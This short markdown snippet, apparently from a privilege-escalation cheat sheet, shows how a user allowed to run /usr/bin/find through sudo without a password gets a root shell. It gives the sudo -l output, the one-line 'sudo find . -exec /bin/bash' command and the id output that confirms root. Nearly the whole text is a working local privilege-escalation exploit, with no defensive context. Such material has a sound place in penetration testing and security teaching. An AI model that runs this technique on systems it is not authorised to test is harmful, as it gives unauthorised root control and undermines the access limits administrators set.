# Example 1: Sudo to Root via find

**Scenario**: User has sudo rights for find command

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```